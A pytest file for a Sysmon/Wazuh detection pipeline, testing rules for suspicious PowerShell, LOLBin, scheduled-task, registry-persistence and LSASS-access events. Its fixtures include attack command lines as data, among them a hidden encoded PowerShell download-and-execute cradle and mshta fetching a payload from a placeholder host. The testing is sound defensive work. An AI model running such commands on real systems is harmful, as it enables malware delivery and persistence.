from datetime import UTC, datetime, timedelta

from wazuh_sysmon_triage.models.findings import EvidenceStrength
from wazuh_sysmon_triage.models.sysmon import (
    NetworkConnectEvent,
    ProcessAccessEvent,
    ProcessCreateEvent,
    RegistryEvent,
)
from wazuh_sysmon_triage.pipeline.detect import (
    detect_alerts,
    filter_alerts,
    is_allowlisted_image,
    run_detection,
)


def test_powershell_pattern_is_evidence_backed_without_numeric_score() -> None:
    event = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, tzinfo=UTC),
        agent_id="999",
        computer="HOST-A",
        process_guid="{PS}",
        process_id=200,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line=(
            "powershell.exe -enc aaa -nop -w hidden "
            "IEX (New-Object Net.WebClient).DownloadString('http://x') "
            "[Convert]::FromBase64String('QQ==')"
        ),
        user="HOST-A\\user",
    )

    alerts = detect_alerts([event])

    assert len(alerts) == 1
    alert = alerts[0]
    assert alert.alert_type == "powershell_encoded_or_download_pattern"
    assert alert.category == "process_behavior"
    assert alert.finding_kind == "observed_pattern"
    assert alert.evidence_strength is EvidenceStrength.DETERMINISTIC
    assert "encoded-command flag" in alert.reason
    assert alert.host_key == event.host_key
    assert alert.evidence_refs == [event.source_ref]
    assert "score" not in type(alert).model_fields
    assert "confidence" not in type(alert).model_fields


def test_powershell_encoding_parameter_does_not_trigger_encoded_command() -> None:
    event = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, tzinfo=UTC),
        agent_id="999",
        process_guid="{PS-NO-ENC}",
        process_id=201,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line=(
            "powershell.exe -Command "
            "\"$x='ok'; $x | Out-File -FilePath C:\\Temp\\ok.txt -Encoding UTF8\""
        ),
        user="HOST\\user",
    )

    alerts = detect_alerts([event])

    assert all(alert.alert_type != "powershell_encoded_or_download_pattern" for alert in alerts)


def test_lolbin_and_user_writable_path_findings_preserve_process_context() -> None:
    process = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, tzinfo=UTC),
        agent_id="999",
        computer="HOST-A",
        process_guid="{LOLBIN}",
        process_id=300,
        image="C:\\Users\\user\\AppData\\Roaming\\mshta.exe",
        command_line="mshta.exe http://mal.example/payload.hta",
        parent_image="C:\\Windows\\explorer.exe",
        user="HOST-A\\user",
    )
    outbound = NetworkConnectEvent(
        event_id=3,
        timestamp=datetime(2024, 1, 1, 0, 0, 5, tzinfo=UTC),
        agent_id="999",
        computer="HOST-A",
        process_guid="{LOLBIN}",
        process_id=300,
        image="C:\\Users\\user\\AppData\\Roaming\\mshta.exe",
        destination_ip="8.8.8.8",
        destination_port=443,
        protocol="tcp",
    )

    alerts = detect_alerts([process, outbound])
    types = {alert.alert_type for alert in alerts}

    assert types == {"lolbin_outbound", "user_writable_path_outbound"}
    for alert in alerts:
        assert alert.command_line == "mshta.exe http://mal.example/payload.hta"
        assert alert.parent_image == "C:\\Windows\\explorer.exe"
        assert alert.category == "network_behavior"
        assert alert.evidence_strength is EvidenceStrength.DETERMINISTIC


def test_periodic_network_pattern_is_labeled_as_a_hypothesis() -> None:
    process = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, tzinfo=UTC),
        agent_id="999",
        computer="HOST-A",
        process_guid="{PERIODIC}",
        process_id=601,
        image="C:\\Windows\\Temp\\agent.exe",
        command_line="agent.exe --sync",
    )
    outbound_events = [
        NetworkConnectEvent(
            event_id=3,
            timestamp=process.timestamp + timedelta(seconds=60 * idx),
            agent_id="999",
            computer="HOST-A",
            process_guid="{PERIODIC}",
            process_id=601,
            image=process.image,
            destination_ip="8.8.8.8",
            destination_port=443,
        )
        for idx in range(4)
    ]

    alerts = detect_alerts([process, *outbound_events])
    periodic = next(alert for alert in alerts if alert.alert_type == "periodic_outbound_pattern")

    assert periodic.finding_kind == "hypothesis"
    assert periodic.evidence_strength is EvidenceStrength.CIRCUMSTANTIAL
    assert "does not establish beaconing" in periodic.reason
    assert periodic.destination_ip == "8.8.8.8"


def test_scheduled_task_rule_states_only_observed_flags() -> None:
    event = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, 1, 0, tzinfo=UTC),
        agent_id="999",
        process_guid="{TASK}",
        process_id=400,
        image="C:\\Windows\\System32\\schtasks.exe",
        command_line=(
            "schtasks.exe /Create /TN Updater /TR "
            '"powershell -File C:\\Users\\user\\AppData\\Local\\Temp\\u.ps1" '
            "/RU SYSTEM /RL HIGHEST"
        ),
    )

    alerts = detect_alerts([event])

    assert len(alerts) == 1
    assert alerts[0].alert_type == "scheduled_task_create"
    assert alerts[0].category == "persistence_behavior"
    assert "/Create flag" in alerts[0].reason
    assert filter_alerts(alerts) == alerts


def test_allowlisted_images_are_suppressed() -> None:
    assert is_allowlisted_image("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe")
    event = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, tzinfo=UTC),
        agent_id="999",
        process_guid="{ALLOW}",
        process_id=111,
        image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        command_line="chrome.exe -enc aQBlAHgA",
    )

    result = run_detection([event])

    assert result.alerts == []
    assert result.suppressed_events == 1
    assert result.suppression_hits == {"allowlist:chrome.exe": 1}


def test_custom_allowlist_override() -> None:
    event = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, tzinfo=UTC),
        agent_id="999",
        process_guid="{OVR}",
        process_id=211,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -enc aQBlAHgA",
    )

    assert detect_alerts([event], allowlist_basenames=["powershell.exe"]) == []


def test_rule_suppression_and_override() -> None:
    event = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, tzinfo=UTC),
        agent_id="999",
        process_guid="{SUP}",
        process_id=777,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -enc aQBlAHgA",
        user="HOST\\svc-trusted",
    )
    suppression = [
        {"name": "trusted_ps", "image_glob": "*powershell.exe", "user": "HOST\\svc-trusted"}
    ]

    suppressed = run_detection([event], suppression_rules=suppression)
    unsuppressed = run_detection(
        [event],
        suppression_rules=suppression,
        allowlist_override_rules=[
            {"name": "keep_ps", "image_glob": "*powershell.exe", "user": "HOST\\svc-trusted"}
        ],
    )

    assert suppressed.alerts == []
    assert suppressed.suppression_hits == {"trusted_ps": 1}
    assert len(unsuppressed.alerts) == 1


def test_context_role_is_a_tag_not_a_risk_downgrade() -> None:
    event = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, tzinfo=UTC),
        agent_id="999",
        agent_name="dev-laptop",
        process_guid="{DEV}",
        process_id=123,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -NoLogo -NoProfile -Command Start-EditorServices",
    )

    result = run_detection(
        [event],
        context_roles={"developer": {"agent_names": ["dev-laptop"]}},
    )
    alert = next(item for item in result.alerts if item.alert_type == "powershell_dev_tooling")

    assert alert.category == "developer_tooling"
    assert "role:developer" in alert.tags
    assert alert.evidence_strength is EvidenceStrength.DETERMINISTIC


def test_multi_event_powershell_context_is_explicitly_correlated() -> None:
    process = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, tzinfo=UTC),
        agent_id="999",
        computer="HOST-A",
        process_guid="{ADV}",
        process_id=987,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe DefineDynamicAssembly",
    )
    outbound = NetworkConnectEvent(
        event_id=3,
        timestamp=datetime(2024, 1, 1, 0, 0, 5, tzinfo=UTC),
        agent_id="999",
        computer="HOST-A",
        process_guid="{ADV}",
        process_id=987,
        image=process.image,
        destination_ip="8.8.8.8",
        destination_port=443,
    )

    alerts = detect_alerts([process, outbound])
    finding = next(
        alert
        for alert in alerts
        if alert.alert_type == "powershell_reflection_or_native_api_pattern"
    )

    assert finding.finding_kind == "correlated_pattern"
    assert finding.evidence_strength is EvidenceStrength.STRONG
    assert "same-process public network destination" in finding.reason


def test_detection_context_never_joins_the_same_guid_across_hosts() -> None:
    host_a_process = ProcessCreateEvent(
        event_id=1,
        timestamp=datetime(2024, 1, 1, tzinfo=UTC),
        agent_id="001",
        computer="HOST-A",
        process_guid="{SHARED}",
        process_id=300,
        image="C:\\Windows\\System32\\mshta.exe",
        command_line="mshta.exe host-a.hta",
    )
    host_b_network = NetworkConnectEvent(
        event_id=3,
        timestamp=datetime(2024, 1, 1, 0, 0, 5, tzinfo=UTC),
        agent_id="002",
        computer="HOST-B",
        process_guid="{SHARED}",
        process_id=300,
        image="C:\\Windows\\System32\\mshta.exe",
        destination_ip="8.8.8.8",
        destination_port=443,
    )

    finding = next(
        alert
        for alert in detect_alerts([host_a_process, host_b_network])
        if alert.alert_type == "lolbin_outbound"
    )

    assert finding.host_key == host_b_network.host_key
    assert finding.command_line is None


def test_dedup_keeps_distinct_minute_buckets() -> None:
    events = [
        ProcessCreateEvent(
            event_id=1,
            timestamp=datetime(2024, 1, 1, 0, minute, 5, tzinfo=UTC),
            agent_id="999",
            process_guid="{PS-LONG}",
            process_id=300,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line="powershell.exe -enc aQBlAHgA",
        )
        for minute in (0, 2)
    ]

    findings = [
        alert
        for alert in detect_alerts(events)
        if alert.alert_type == "powershell_encoded_or_download_pattern"
    ]

    assert len(findings) == 2


def test_process_launch_burst_does_not_create_a_score_accumulation_alert() -> None:
    base_ts = datetime(2024, 1, 1, 2, 0, tzinfo=UTC)
    events = [
        ProcessCreateEvent(
            event_id=1,
            timestamp=base_ts + timedelta(seconds=12 * idx),
            agent_id="999",
            computer="HOST-A",
            process_guid=f"{{BURST-{idx}}}",
            process_id=700 + idx,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line="powershell.exe -enc aQBlAHgA",
        )
        for idx in range(6)
    ]

    alerts = detect_alerts(events)
    types = {alert.alert_type for alert in alerts}
    burst = next(alert for alert in alerts if alert.alert_type == "process_launch_burst")

    assert "executive_hot_host" not in types
    assert burst.finding_kind == "aggregate_pattern"
    assert "not a maliciousness verdict" in burst.reason


def test_registry_persistence_finding_preserves_exact_location_and_process_context() -> None:
    ts = datetime(2024, 1, 1, tzinfo=UTC)
    process = ProcessCreateEvent(
        timestamp=ts,
        agent_id="001",
        computer="HOST-A",
        process_guid="{REG}",
        process_id=100,
        image="C:\\Windows\\System32\\reg.exe",
        command_line="reg add HKCU\\...\\Run /v Updater",
        parent_image="C:\\Windows\\System32\\cmd.exe",
    )
    registry = RegistryEvent(
        event_id=13,
        timestamp=ts + timedelta(seconds=1),
        agent_id="001",
        computer="HOST-A",
        process_guid="{REG}",
        process_id=100,
        image=process.image,
        registry_event_type="SetValue",
        target_object="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Updater",
        details="C:\\Users\\alice\\update.exe",
    )

    finding = next(
        item
        for item in detect_alerts([process, registry])
        if item.alert_type == "registry_persistence_location_modified"
    )

    assert finding.category == "persistence_behavior"
    assert finding.finding_kind == "correlated_pattern"
    assert "location=RunOnce key" in finding.reason
    assert registry.target_object in finding.reason
    assert finding.command_line == process.command_line


def test_lsass_access_is_an_investigation_lead_not_credential_theft_verdict() -> None:
    event = ProcessAccessEvent(
        timestamp=datetime(2024, 1, 1, tzinfo=UTC),
        agent_id="001",
        computer="HOST-A",
        process_guid="{READER}",
        process_id=200,
        image="C:\\Tools\\reader.exe",
        target_process_guid="{LSASS}",
        target_process_id=500,
        target_image="C:\\Windows\\System32\\lsass.exe",
        granted_access="0x1010",
    )

    finding = next(
        item for item in detect_alerts([event]) if item.alert_type == "lsass_process_access"
    )

    assert finding.category == "credential_access_behavior"
    assert finding.evidence_strength is EvidenceStrength.DETERMINISTIC
    assert "not proof of credential theft" in finding.reason
    assert "0x1010" in finding.reason
